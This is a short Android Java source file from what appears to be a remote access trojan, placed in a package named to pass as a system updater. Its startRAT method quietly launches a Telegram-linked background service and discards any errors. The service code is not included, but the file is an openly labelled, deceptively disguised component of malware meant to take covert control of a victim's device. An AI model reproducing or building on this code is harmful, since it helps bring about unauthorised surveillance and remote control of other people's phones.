package com.sys.updater;

import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class Launcher {
    public static void startRAT(Context context) {
        try {
            Intent intent = new Intent(context, TelegramService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {}
    }
              }
